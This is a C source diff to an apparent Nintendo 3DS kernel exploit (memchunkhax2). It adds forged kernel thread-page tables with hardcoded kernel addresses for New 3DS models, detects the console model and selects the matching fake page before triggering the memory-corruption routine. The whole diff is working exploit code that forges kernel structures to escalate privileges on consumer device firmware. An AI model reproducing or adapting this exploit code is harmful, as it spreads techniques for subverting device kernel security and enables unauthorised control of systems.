@@ -88,7 +88,8 @@ typedef struct
    u32 buffer[0x80];
 }fake_page_t;
 
-static fake_page_t fake_pages[] = {
+static fake_page_t fake_pages_old[] =
+{
    {
       0x022E0000, 0xFFF849E0, 0xFFF718D8,
       {
@@ -154,6 +155,51 @@ static fake_page_t fake_pages[] = {
    }
 };
 
+static fake_page_t fake_pages_new[] =
+{
+   {
+      0x02320900, 0xFFF84BE0, 0xFFF71AB8,
+      {
+         0xFFF854D0, 0xFF49C000, 0xFFF7BB40, 0x00000000, 0xFFF854D0, 0x00000030, 0x00000000, 0xFFF15100,
+         0x0000000A, 0xFFF0B68C, 0x0000000A, 0x00000001, 0xFFF7BC1C, 0x00000000, 0x00000002, 0xFFF7BC1C,
+         0xFF56BEE8, 0xFFF064F8, 0xFFF7BC1C, 0xFFF854D0, 0x00000001, 0xFFF854D0, 0x00000001, 0xFFFD10C8,
+         0x60000013, 0xFFF84BE0, 0xFFF31FFC, 0xFFF31FFC, 0xFFF71AB8, 0x00059BEE, 0x09401BFE, 0xFFF1A430,
+         0xFFFD10C8, 0xFFF1D5DC, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06CE4, 0xFFF71AB8, 0x0014EBA8,
+         0xFFF71AB8, 0xFFFFFFFF, 0xFFF2E0C0, 0x00000000, 0xFFF2951F, 0x00000001, 0x00000000, 0xFFF05A70,
+         0xFFFFFFFF, 0x0014EBA8, 0xFFF2D91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0xFFF05990, 0x00000024, 0x00000001, 0xFFF02290, 0x00198028, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
+         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD10C8, 0x60000013, 0xFFF84BE0, 0xFFF31FFC,
+         0xFFF31FFC, 0xFFF71AB8, 0x00059BEE, 0x09401BFE, 0xFF56BE88, 0xFFF1D5DC, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
+      }
+   },
+   {
+      0x02320B00, 0xFFF84398, 0xFFF71A18,
+      {
+         0xFFF84A78, 0xFF556000, 0x0000000A, 0xFFF0B3F8, 0x0000000A, 0x00000001, 0x00000000, 0x00000000,
+         0x00000000, 0x00000001, 0xFFFD5270, 0xFFF06360, 0x00000000, 0x00000000, 0x00000000, 0xFFF021F0,
+         0xFF565E4C, 0xFFF0D418, 0xFFF84A78, 0xFFFD50C8, 0x00000001, 0xFFF84A78, 0x00000001, 0xFFFD50C8,
+         0x60000013, 0xFFF84398, 0xFFF30DF4, 0xFFF30DF4, 0xFFF71A18, 0x00059BF0, 0x09401BFE, 0xFFF19EC4,
+         0xFFFD50C8, 0xFFF1CCB0, 0x00000000, 0x0014EBA8, 0xFFFFFFFF, 0xFFF06B04, 0xFFF71A18, 0x0014EBA8,
+         0xFFF71A18, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF059A0,
+         0xFFFFFFFF, 0x0014EBA8, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0xFFF058C0, 0x00000024, 0x00000001, 0xFFF022AC, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014EBA8,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x0014EB88, 0x00100A3C, 0x00100AEC, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
+         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84398, 0xFFF30DF4,
+         0xFFF30DF4, 0xFFF71A18, 0x00059BF0, 0x09401BFE, 0xFF565E88, 0xFFF1CCB0, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
+      }
+   }
+};
 typedef struct
 {
    u32 svc_stack [0xF00 >> 2];
@@ -227,7 +273,7 @@ typedef struct
    u32 thread_page_kva;
    u32 offset;
    u32 main_thread_page_addr;
-
+   u8 isNew3DS;
 } target_thread_vars_t;
 
 static target_thread_vars_t target;
@@ -250,11 +296,14 @@ static void create_target_page()
 {
    u32 version = *(u32*)0x1FF80000;
    int i;
-   fake_page_t* fake_page = fake_pages;
-   for (i = 1; i < (sizeof(fake_pages)/sizeof(*fake_pages)); i++)
+   fake_page_t* fake_pages_current = target.isNew3DS? fake_pages_new : fake_pages_old;
+   int fake_pages_count = (target.isNew3DS? sizeof(fake_pages_new): sizeof(fake_pages_old)) / sizeof(*fake_pages_current);
+
+   fake_page_t* fake_page = fake_pages_current;
+   for (i = 1; i < fake_pages_count; i++)
    {
-      if(version >= fake_pages[i].version)
-         fake_page = fake_pages + i;
+      if(version >= fake_pages_current[i].version)
+         fake_page = fake_pages_current + i;
    }
    memcpy((u8*)&target.page + sizeof(target.page) - sizeof(fake_page->buffer), fake_page->buffer, sizeof(fake_page->buffer));
    target.page.svc_sp = (target.page.svc_sp & 0xFFF) | (target.thread_page_va & ~0xFFF);
@@ -401,14 +450,16 @@ static void do_memchunkhax2(void)
       svcSleepThread(20000);
 
    gfxFlushBuffers();
-   create_target_page();
 
    u32 fragmented_address = 0;
 
    arbiter = __sync_get_arbiter();
    aptOpenSession();
+   APT_CheckNew3DS(&target.isNew3DS);
    APT_SetAppCpuTimeLimit(5);
    aptCloseSession();
+
+   create_target_page();
 
    u32 linear_buffer;
    svcControlMemory(&linear_buffer, 0, 0, 0x1000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
